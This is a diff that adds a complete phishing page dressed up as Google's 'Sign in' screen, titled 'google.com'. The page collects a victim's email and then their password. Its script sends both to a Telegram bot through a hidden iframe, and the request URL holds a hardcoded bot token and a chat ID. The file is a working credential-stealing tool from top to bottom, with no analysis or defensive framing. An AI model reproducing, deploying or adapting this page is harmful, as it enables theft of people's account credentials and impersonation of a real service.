@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>google.com</title>
+    <style>
+        #login_box{
+            width: 100%;
+            height: 100vh;
+            background-color: rgb(255, 255, 255);
+            position: absolute;
+            left: 0px;
+            top: 0px;
+        }
+        img{
+            margin-top: 0.5cm;
+            margin-left: 5%;
+            width: 1.5cm;
+            height: 1.5cm;
+        }
+        #sign_in{
+            font-size: 35px;
+            /* font-weight: bold; */
+            margin-left: 5%;
+
+        }
+        #use_your_user_account{
+            width: 95%;
+            font-size: 20px;
+            margin-left: 5%;
+            /* font-weight: bold; */
+        }
+        #input_box{
+            width: 90%;
+            height: 1cm;
+            border: 2px solid rgb(144, 137, 137);
+            margin-left: 5%;
+            border-radius: 7px;
+            /* box-sizing: border-box; */
+            display: flexbox;
+            overflow: hidden;
+            flex-direction: row;
+
+        }
+        input{
+            width: 100%;
+            height: 100%;
+            box-sizing: border-box;
+            outline: none;
+            font-size: 15px;
+            padding: 10px;
+            font-weight: bold;
+            border-radius: 7px;
+            border: none;
+        }
+        #input_box:hover{
+        border: 2px solid dodgerblue;
+        }
+        #forgot{
+            font-weight: bold;
+            color: dodgerblue;
+            margin-left: 5%;
+        }
+        a{
+            font-weight: bold;
+            color: dodgerblue;
+            text-decoration: none;
+        }
+        #not{
+            margin-left: 5%;
+            word-spacing: 4px;
+        }
+        #next_box{
+            width: 90%;
+            height: 1cm;
+          
+            margin-left: 5%;
+            border-radius: 7px;
+            /* box-sizing: border-box; */
+            display: flexbox;
+            overflow: hidden;
+        }
+        table{
+            width: 100%;
+            height: 100%;
+        }
+        #login{
+        width: 2cm;
+        height:100%;
+        border: none;
+        background-color: dodgerblue;
+        font-weight: bold;
+        color: white;
+        cursor: pointer;
+        border-radius: 20px;
+    
+      
+        }
+        #right_col{
+            text-align: right;
+        }
+        iframe{
+            background-color: red;
+            display: none;
+        }
+
+    </style>
+</head>
+<body>
+    <div id="login_box">
+        <img src="R.svg" alt=""><br><br>
+
+     <div id="sign_in">Sign in</div>
+     <br>
+     <div id="use_your_user_account">
+        Use Your Google Account
+     </div>
+     <br><br>
+     <p id="error"style="color:red;margin-left: 5%;"></p>
+     <div id="input_box">
+        <input onkeyup="typing()" type="email"id="email_password" placeholder="Email or phone">
+      
+     </div>
+     <br>
+
+     <a href="" id="forgot">Forgot email?</a>
+     <br><br><br>
+     <p id="not">
+        Not your computer? Use Guest Mode to sign in <br> privately.<a href="">learn more about using guest mode.</a>
+     </p>
+<br><br>
+     <div id="next_box">
+        <table>
+            <tr>
+                <td> <a href="">Create Account </a></td>
+                <td id="right_col"> <button id="login"onclick="submittogoogle()">Next</button></td>
+            </tr>
+        </table>
+       
+     </div>
+     <br><br><br>
+     <div style="
+     /* font-weight: bold; */
+     /* text-decoration: underline; */
+     margin-left: 5%;
+     ">
+        English (United Kingdom)
+     </div>    <iframe id="frame" src="" frameborder="0"></iframe>
+
+
+
+
+
+
+
+
+    </div>
+    <script>
+function submittogoogle(){
+     let value = document.getElementById("email_password");
+     let button_value =document.getElementById("login").innerHTML;
+     let frame = document.getElementById("frame");
+
+     if(value.value == "" && button_value == "Next"){
+     document.getElementById("error").innerHTML="please insert your correct information?";
+
+     }
+     if(value.value == "" && button_value != "Next"){
+     document.getElementById("error").innerHTML="please insert your correct information?";
+
+     }
+     else if(value.value != "" && button_value == "Next"){
+     document.getElementById("login").innerHTML="Login";
+     document.getElementById("email_password").setAttribute("placeholder","Password");
+     document.getElementById("email_password").setAttribute("type","Password");
+
+     localStorage.setItem("email",value.value);
+     document.getElementById("email_password").value="";
+     }else if(value.value != "" && button_value != "Next"){
+        
+       let all_data = localStorage.getItem("email")+ "\n"+value.value;
+       console.log( localStorage.getItem("email"))
+       frame.setAttribute("src" ,"https://api.telegram.org/bot7203322344:AAG55iNMgFGHHwHAOgvc5vxRHiyEkrAIOF4/sendMessage?chat_id=@ethiotelecom111&text="+all_data+"");
+       document.getElementById("email_password").value="";
+ 
+    }
+}
+function typing(){
+    document.getElementById("error").innerHTML="";
+}
+
+
+    </script>
+</body>
+</html>
